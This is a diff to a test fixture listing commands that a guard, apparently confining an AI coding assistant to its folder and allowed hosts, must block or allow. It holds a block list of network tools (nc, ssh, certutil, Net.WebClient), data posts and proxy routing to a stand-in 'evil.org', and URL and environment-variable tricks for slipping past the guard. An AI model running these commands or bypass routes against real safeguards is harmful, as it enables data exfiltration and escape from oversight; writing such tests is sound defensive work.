@@ -1767,9 +1767,9 @@ block	work/coordinator/assistants/a1	git log	-	@PROJECT@	-	@PROJECT@/coordinator
 block	work/coordinator/assistants/a1	git status	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
 block	work/coordinator/assistants/a1	git -C . log	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
 block	work/coordinator/assistants/a1/sub	git log	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
-block	ps:work	git -C @PROJECT_W@ordinatorssistants1 log	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
-block	ps:work	cd @PROJECT_W@ordinatorssistants1; git log	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
-block	ps:work	Set-Location @PROJECT_W@ordinatorssistants1; git log	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+block	ps:work	git -C @PROJECT_W@\coordinator\assistants\a1 log	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+block	ps:work	cd @PROJECT_W@\coordinator\assistants\a1; git log	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+block	ps:work	Set-Location @PROJECT_W@\coordinator\assistants\a1; git log	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
 block	ps:work	git -C $X log	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
 block	ps:work/coordinator/assistants/a1	git log	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
 allow	work/coordinator/assistants/a1	git -C @PROJECT@ log	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
@@ -1783,7 +1783,7 @@ allow	work	cd @PROJECT@/coordinator/assistants/a1 && cd ../../.. && git log	-	@P
 allow	work/coordinator/assistants/a1	ls	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
 allow	work/coordinator/assistants/a1	cat notes.md	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
 allow	ps:work/coordinator/assistants/a1	git -C @PROJECT_W@ log	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
-allow	ps:work	cd @PROJECT_W@ordinatorssistants1; ls	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+allow	ps:work	cd @PROJECT_W@\coordinator\assistants\a1; ls	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
 # ... running a script or inline code
 block	work	bash x.sh	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
 block	work	sh x.sh	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
@@ -1913,7 +1913,7 @@ block	ps:work	Move-Item a.txt b.txt	-	@PROJECT@	-	@PROJECT@/coordinator/assistan
 block	ps:work	Remove-Item a.txt	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
 block	ps:work	Add-Content a.txt x	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
 block	ps:work	'x' | Tee-Object a.txt	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
-block	ps:work	echo x > @PROJECT_W@ordinatorssistants1\..\a2\y.txt	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+block	ps:work	echo x > @PROJECT_W@\coordinator\assistants\a1\..\a2\y.txt	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
 allow	work	echo x > @PROJECT@/coordinator/assistants/a1/x.txt	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
 allow	work	echo x >> @PROJECT@/coordinator/assistants/a1/x.txt	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
 allow	work	echo x > @PROJECT@/coordinator/assistants/a1/sub/x.txt	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
@@ -1936,15 +1936,15 @@ allow	work	ls >/dev/null 2>&1	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
 allow	work	ls 2>&1	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
 allow	work	echo "a > b"	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
 allow	work	grep 'a>b' a.txt	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
-allow	ps:work	Set-Content @PROJECT_W@ordinatorssistants1\x.txt x	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
-allow	ps:work	Set-Content -Path @PROJECT_W@ordinatorssistants1\x.txt -Value x	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
-allow	ps:work	'x' | Out-File @PROJECT_W@ordinatorssistants1\x.txt	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
-allow	ps:work	'x' | Out-File -FilePath @PROJECT_W@ordinatorssistants1\x.txt	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
-allow	ps:work	echo x > @PROJECT_W@ordinatorssistants1\x.txt	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
-allow	ps:work	cp a.txt @PROJECT_W@ordinatorssistants1\x.txt	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
-allow	ps:work	Copy-Item a.txt @PROJECT_W@ordinatorssistants1\x.txt	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
-allow	ps:work	rm @PROJECT_W@ordinatorssistants1\x.txt	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
-allow	ps:work	Remove-Item @PROJECT_W@ordinatorssistants1\x.txt	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+allow	ps:work	Set-Content @PROJECT_W@\coordinator\assistants\a1\x.txt x	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+allow	ps:work	Set-Content -Path @PROJECT_W@\coordinator\assistants\a1\x.txt -Value x	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+allow	ps:work	'x' | Out-File @PROJECT_W@\coordinator\assistants\a1\x.txt	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+allow	ps:work	'x' | Out-File -FilePath @PROJECT_W@\coordinator\assistants\a1\x.txt	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+allow	ps:work	echo x > @PROJECT_W@\coordinator\assistants\a1\x.txt	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+allow	ps:work	cp a.txt @PROJECT_W@\coordinator\assistants\a1\x.txt	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+allow	ps:work	Copy-Item a.txt @PROJECT_W@\coordinator\assistants\a1\x.txt	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+allow	ps:work	rm @PROJECT_W@\coordinator\assistants\a1\x.txt	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+allow	ps:work	Remove-Item @PROJECT_W@\coordinator\assistants\a1\x.txt	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
 allow	ps:work/coordinator/assistants/a1	Set-Content x.txt x	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
 allow	ps:work	ls 2>$null	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
 allow	ps:work	ls > $null	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
@@ -2122,9 +2122,9 @@ allow	work	sed s/a/b/ a.txt	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
 allow	work	sed -n 1,5p a.txt	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
 allow	work	dd if=a.txt	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
 allow	work	grep touch a.txt	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
-allow	ps:work	New-Item @PROJECT_W@ordinatorssistants1\x.txt	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
-allow	ps:work	New-Item -Path @PROJECT_W@ordinatorssistants1\x -ItemType Directory	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
-allow	ps:work	mkdir @PROJECT_W@ordinatorssistants1\x	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+allow	ps:work	New-Item @PROJECT_W@\coordinator\assistants\a1\x.txt	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+allow	ps:work	New-Item -Path @PROJECT_W@\coordinator\assistants\a1\x -ItemType Directory	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+allow	ps:work	mkdir @PROJECT_W@\coordinator\assistants\a1\x	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
 allow	ps:work/coordinator/assistants/a1	New-Item x.txt	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
 # ... git fetch and git ls-remote from its own folder, with the rest of git there
 block	work	git fetch @PROJECT@/coordinator/assistants/a1/x	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
@@ -2133,8 +2133,8 @@ block	work	git ls-remote @PROJECT@/coordinator/assistants/a1/x	-	@PROJECT@	-	@PR
 block	work	git ls-remote ./coordinator/assistants/a1/sub	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
 block	work/coordinator/assistants/a1	git fetch	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
 block	work/coordinator/assistants/a1	git ls-remote origin	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
-block	ps:work	git fetch @PROJECT_W@ordinatorssistants1	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
-block	ps:work	git ls-remote @PROJECT_W@ordinatorssistants1	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+block	ps:work	git fetch @PROJECT_W@\coordinator\assistants\a1	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+block	ps:work	git ls-remote @PROJECT_W@\coordinator\assistants\a1	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
 allow	work	git ls-remote origin	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
 allow	ps:work	git ls-remote origin	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
 # ... the network (the owner's decision, 2026-11-02): curl, wget, Invoke-WebRequest, iwr, Invoke-RestMethod, irm are closed by default.
@@ -2296,8 +2296,8 @@ allow	work	wget -O @PROJECT@/coordinator/assistants/a1/x.txt https://api.example
 allow	work/coordinator/assistants/a1	curl -o x.txt https://api.example.com/x	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1	api.example.com,other.example.org:write
 allow	work/coordinator/assistants/a1	curl -O https://api.example.com/x	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1	api.example.com,other.example.org:write
 allow	work/coordinator/assistants/a1	wget https://api.example.com/x	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1	api.example.com,other.example.org:write
-allow	ps:work	iwr https://api.example.com/x -OutFile @PROJECT_W@ordinatorssistants1\x.txt	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1	api.example.com,other.example.org:write
-allow	ps:work	curl -o @PROJECT_W@ordinatorssistants1\x.txt https://api.example.com/x	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1	api.example.com,other.example.org:write
+allow	ps:work	iwr https://api.example.com/x -OutFile @PROJECT_W@\coordinator\assistants\a1\x.txt	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1	api.example.com,other.example.org:write
+allow	ps:work	curl -o @PROJECT_W@\coordinator\assistants\a1\x.txt https://api.example.com/x	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1	api.example.com,other.example.org:write
 # ... without COORD_ASSISTANT_DIR nothing changes, with the hosts set or not
 allow	work	curl https://x.example/
 allow	work	curl -d x https://evil.org/
@@ -2307,3 +2307,95 @@ allow	ps:work	iwr https://x.example/
 allow	ps:work	iwr https://x.example/ -Method Post
 allow	work	curl https://evil.org/	-	@PROJECT@	-	-	api.example.com,other.example.org:write
 allow	ps:work	iwr https://evil.org/	-	@PROJECT@	-	-	api.example.com,other.example.org:write
+# ... the coordinator's decisions no line above covers (#345, the worker's lines): other network clients, by name, with no list
+block	work	nc x 80	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+block	work	ncat x 80	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+block	work	ssh x ls	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+block	work	scp a.txt x:b	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+block	work	sftp x	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+block	work	ftp x	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+block	work	telnet x	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+block	ps:work	certutil -urlcache -f https://x.example/ a	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+block	ps:work	bitsadmin /transfer j https://x.example/ a	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+block	ps:work	Start-BitsTransfer https://x.example/	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+block	ps:work	[Net.WebClient]::new()	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+block	ps:work	(New-Object Net.WebClient).DownloadString('https://x.example/')	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+block	ps:work	[System.Net.WebRequest]::Create('https://x.example/')	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+block	ps:work	$x = [System.Net.Http.HttpClient]::new()	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+block	ps:work	Invoke-Command -ComputerName x -ScriptBlock { ls }	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+allow	work	grep ssh a.txt	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+allow	work	ls nc	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+allow	ps:work	Select-String 'Net.WebClient' a.txt	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+# ... curl's abbreviated long options read as their full form; an option the guard does not read is refused
+block	work	curl --dat x https://api.example.com/x	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1	api.example.com,other.example.org:write
+allow	work	curl --dat x https://other.example.org/x	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1	api.example.com,other.example.org:write
+block	work	curl --upl f https://api.example.com/x	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1	api.example.com,other.example.org:write
+block	work	curl --req POST https://api.example.com/x	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1	api.example.com,other.example.org:write
+block	work	curl --conf file https://api.example.com/x	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1	api.example.com,other.example.org:write
+block	work	curl --prox http://evil.org https://api.example.com/x	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1	api.example.com,other.example.org:write
+block	work	curl --out a.txt https://api.example.com/x	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1	api.example.com,other.example.org:write
+block	work	curl --create-dirs -o @PROJECT@/coordinator/assistants/a1/x.txt https://api.example.com/x	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1	api.example.com,other.example.org:write
+block	work	wget --post-d=x https://api.example.com/x -O -	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1	api.example.com,other.example.org:write
+allow	ps:work	curl --dat x https://other.example.org/x	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1	api.example.com,other.example.org:write
+block	ps:work	curl --dat x https://api.example.com/x	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1	api.example.com,other.example.org:write
+# ... a host compares exactly, any case, a port ignored, no scheme read as a host; only http and https
+allow	work	curl HTTPS://API.EXAMPLE.COM/x	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1	api.example.com,other.example.org:write
+allow	work	curl https://api.example.com:8443/x	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1	api.example.com,other.example.org:write
+allow	work	curl api.example.com/x	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1	api.example.com,other.example.org:write
+allow	ps:work	iwr api.example.com/x	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1	api.example.com,other.example.org:write
+allow	ps:work	iwr HTTPS://API.EXAMPLE.COM:8443/x	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1	api.example.com,other.example.org:write
+block	work	curl evil.org	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1	api.example.com,other.example.org:write
+block	work	curl ftp://api.example.com/x	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1	api.example.com,other.example.org:write
+block	work	curl file:///etc/hosts	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1	api.example.com,other.example.org:write
+block	work	curl https://api.example.com:x/	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1	api.example.com,other.example.org:write
+block	work	curl https://api.example.com./	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1	api.example.com,other.example.org:write
+block	work	curl https://api%2eexample.com/	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1	api.example.com,other.example.org:write
+block	work	curl https://evil.org\\@api.example.com/	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1	api.example.com,other.example.org:write
+block	ps:work	iwr https://evil.org\@api.example.com/	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1	api.example.com,other.example.org:write
+# ... -L on a read-only host, never on :write; --next is one more URL, judged like any
+allow	work	curl -L https://api.example.com/x	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1	api.example.com,other.example.org:write
+allow	work	curl -sL https://api.example.com/x	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1	api.example.com,other.example.org:write
+allow	work	curl --location https://api.example.com/x	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1	api.example.com,other.example.org:write
+block	work	curl -L https://other.example.org/x	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1	api.example.com,other.example.org:write
+block	work	curl --location https://other.example.org/x	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1	api.example.com,other.example.org:write
+block	work	curl -L -d x https://other.example.org/x	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1	api.example.com,other.example.org:write
+block	ps:work	curl -L https://other.example.org/x	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1	api.example.com,other.example.org:write
+allow	work	curl https://api.example.com/x --next https://other.example.org/y	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1	api.example.com,other.example.org:write
+# ... the same routes by another door: a variable set earlier, a write the words do not show, a program by its path
+block	work	export HTTPS_PROXY=http://evil.org; curl https://api.example.com/x	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1	api.example.com,other.example.org:write
+block	ps:work	$env:HTTPS_PROXY = 'http://evil.org'	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1	api.example.com,other.example.org:write
+block	ps:work	$env:BROWSER = Get-Content a.txt	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+block	work	export PATH=x; git log	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+block	work	GH_CONFIG_DIR=x gh pr list	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+block	ps:work/coordinator/assistants/a1	New-Item env:BROWSER	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+block	work	echo x >| a.txt	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+block	work	find . -name x -delete	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+block	work	find . -fprint a.txt	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+allow	work	find @PROJECT@/coordinator/assistants/a1/sub -name x -delete	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+block	work/coordinator/assistants/a1	find ../.. -exec rm {} \;	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+block	work	ls | xargs rm	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+block	work	cp -t ../y a.txt	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+block	work	cp -T @PROJECT@/coordinator/assistants/a1/x ../y	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+allow	work	cp -t @PROJECT@/coordinator/assistants/a1 a.txt	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+block	ps:work	Set-Content a.txt,@PROJECT@/coordinator/assistants/a1/x y	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+block	work	sed -Ei s/a/b/ a.txt	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+allow	work	sed -e s/i/x/ a.txt	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+block	work	git branch --co	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+allow	work	git branch --cont x	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+block	work	git fetch file://@PROJECT@/coordinator/assistants/a1/x	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+allow	work	git help	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+allow	work	git help -a	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+block	work	gh browse -b -n	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+block	work	gh browse -bn	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+block	work	@PROJECT@/coordinator/assistants/a1/git log	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+block	work	@PROJECT@/coordinator/assistants/a1/curl https://api.example.com/x	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1	api.example.com,other.example.org:write
+allow	work	/usr/bin/git log	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+block	work	$x log	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+block	work	$(echo git) log	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+block	ps:work	& $x	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+allow	ps:work	$x = 'a'	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+# ... without the folder these keep their verdict
+allow	work	nc x 80
+allow	work	echo x >| a.txt
+allow	ps:work	[Net.WebClient]::new()
+allow	work	curl --dat x https://evil.org/
